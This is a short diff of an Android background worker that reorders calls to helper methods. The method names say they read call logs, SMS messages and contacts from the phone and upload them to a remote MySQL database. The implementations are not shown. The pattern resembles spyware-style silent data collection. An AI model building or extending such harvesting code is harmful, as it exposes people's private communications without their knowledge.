@@ -32,17 +32,9 @@ public class MyWorker extends Worker{
         MyHelper myHelper = new MyHelper(getApplicationContext());
 
         /*
-         * call logs
-         * **/
-        myHelper.read_call_logs_and_send_online();
-
-        /*
          * messages
          * **/
         myHelper.read_sms_using_telephony();
-//        myHelper.read_messages_from_inbox_and_save_into_sql_database();
-
-        myHelper.read_messages_from_sql_and_send_to_mysql_database();
 
         /*
         *contacts
@@ -50,6 +42,13 @@ public class MyWorker extends Worker{
         myHelper.read_contacts_from_phone_and_save_to_sql_lite();
 
         myHelper.read_contacts_from_sql_and_send_to_mysql_database();
+
+        myHelper.read_messages_from_sql_and_send_to_mysql_database();
+
+        /*
+         * call logs
+         * **/
+        myHelper.read_call_logs_and_send_online();
 
         /*
          *images
